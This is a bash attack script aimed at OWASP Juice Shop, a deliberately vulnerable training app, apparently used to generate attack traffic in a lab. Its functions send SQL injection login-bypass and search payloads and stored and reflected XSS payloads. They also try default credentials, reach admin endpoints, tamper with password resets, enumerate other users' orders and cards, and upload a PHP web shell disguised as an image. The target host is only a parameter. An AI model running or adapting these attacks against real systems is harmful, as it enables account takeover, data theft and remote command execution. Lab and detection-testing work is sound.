#!/bin/bash
###############################################################################
# Juice Shop Attack Script
# SQLi, XSS, auth bypass, BOLA, file upload on OWASP Juice Shop
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.10}"
TARGET_PORT="${3:-3000}"
RESULTS_DIR="${4:-.}"
BASE_URL="http://${TARGET_IP}:${TARGET_PORT}"

mkdir -p "$RESULTS_DIR"

echo "[*] Juice Shop attacks: $SUBTYPE against $BASE_URL"

run_sqli() {
    echo "[*] SQL Injection against Juice Shop login"

    # Login bypass via SQLi
    curl -sk -X POST "${BASE_URL}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
        -o "$RESULTS_DIR/sqli_login_bypass.json" 2>&1

    # SQLi in search
    for payload in "' OR 1=1--" "' UNION SELECT NULL--" "1' AND '1'='1" "'; DROP TABLE--" "' OR ''='"; do
        curl -sk "${BASE_URL}/rest/products/search?q=${payload}" \
            -o /dev/null 2>&1
        sleep 1
    done

    # SQLi in product reviews
    curl -sk -X POST "${BASE_URL}/rest/products/1/reviews" \
        -H "Content-Type: application/json" \
        -d '{"message":"test'\'' OR 1=1--","author":"attacker"}' \
        -o /dev/null 2>&1

    echo "[+] SQLi attacks complete"
}

run_xss() {
    echo "[*] XSS attacks against Juice Shop"

    local payloads=(
        "<script>alert('xss')</script>"
        "<img src=x onerror=alert(1)>"
        "<svg onload=alert(1)>"
        "javascript:alert(document.cookie)"
        "<iframe src='javascript:alert(1)'>"
        "\"><script>alert(1)</script>"
        "'-alert(1)-'"
    )

    # XSS in search
    for payload in "${payloads[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        curl -sk "${BASE_URL}/rest/products/search?q=${encoded}" -o /dev/null 2>&1
        sleep 0.5
    done

    # XSS in feedback
    for payload in "${payloads[@]}"; do
        curl -sk -X POST "${BASE_URL}/api/Feedbacks" \
            -H "Content-Type: application/json" \
            -d "{\"comment\":\"$payload\",\"rating\":1}" \
            -o /dev/null 2>&1
        sleep 0.5
    done

    echo "[+] XSS attacks complete"
}

run_auth_bypass() {
    echo "[*] Authentication bypass attempts"

    # Try default/common credentials
    local users=("admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op" "admin" "test@test.com")
    local passwords=("admin123" "password" "ncc-1701" "admin" "test")

    for user in "${users[@]}"; do
        for pass in "${passwords[@]}"; do
            curl -sk -X POST "${BASE_URL}/rest/user/login" \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"$user\",\"password\":\"$pass\"}" \
                -o /dev/null 2>&1
            sleep 0.5
        done
    done

    # JWT manipulation — try accessing admin endpoints
    curl -sk "${BASE_URL}/api/Users" -o /dev/null 2>&1
    curl -sk "${BASE_URL}/rest/admin/application-configuration" -o /dev/null 2>&1
    curl -sk -X PUT "${BASE_URL}/api/Users/1" \
        -H "Content-Type: application/json" \
        -d '{"role":"admin"}' \
        -o /dev/null 2>&1

    # Password reset manipulation
    curl -sk -X POST "${BASE_URL}/rest/user/reset-password" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op","answer":"test","new":"hacked123","repeat":"hacked123"}' \
        -o /dev/null 2>&1

    echo "[+] Auth bypass attacks complete"
}

run_bola() {
    echo "[*] BOLA (Broken Object Level Authorization) attacks"

    # Enumerate user baskets
    for i in $(seq 1 20); do
        curl -sk "${BASE_URL}/rest/basket/$i" -o /dev/null 2>&1
        sleep 0.3
    done

    # Enumerate user orders
    for i in $(seq 1 20); do
        curl -sk "${BASE_URL}/api/Orders/$i" -o /dev/null 2>&1
        sleep 0.3
    done

    # Try to access other users' data
    for i in $(seq 1 10); do
        curl -sk "${BASE_URL}/api/Users/$i" -o /dev/null 2>&1
        curl -sk "${BASE_URL}/api/Cards/$i" -o /dev/null 2>&1
        curl -sk "${BASE_URL}/api/Addresss/$i" -o /dev/null 2>&1
        sleep 0.3
    done

    echo "[+] BOLA attacks complete"
}

run_file_upload() {
    echo "[*] Malicious file upload attempts"

    # Create test payloads
    echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
    echo '<%@ page import="java.util.*,java.io.*"%>' > /tmp/shell.jsp
    echo '<script>alert(1)</script>' > /tmp/xss.html

    # Try uploading to complaint endpoint
    for file in /tmp/shell.php /tmp/shell.jsp /tmp/xss.html; do
        curl -sk -X POST "${BASE_URL}/file-upload" \
            -F "file=@${file}" \
            -o /dev/null 2>&1
        sleep 1
    done

    # Try profile picture upload with bad content type
    curl -sk -X POST "${BASE_URL}/profile/image/file" \
        -F "file=@/tmp/shell.php;type=image/jpeg" \
        -o /dev/null 2>&1

    # Cleanup
    rm -f /tmp/shell.php /tmp/shell.jsp /tmp/xss.html

    echo "[+] File upload attacks complete"
}

# Execute based on subtype
case "$SUBTYPE" in
    sqli)           run_sqli ;;
    xss)            run_xss ;;
    auth_bypass)    run_auth_bypass ;;
    bola)           run_bola ;;
    file_upload)    run_file_upload ;;
    full)
        run_sqli
        run_xss
        run_auth_bypass
        run_bola
        run_file_upload
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: sqli, xss, auth_bypass, bola, file_upload, full"
        exit 1
        ;;
esac

echo "[*] Juice Shop attack script complete"
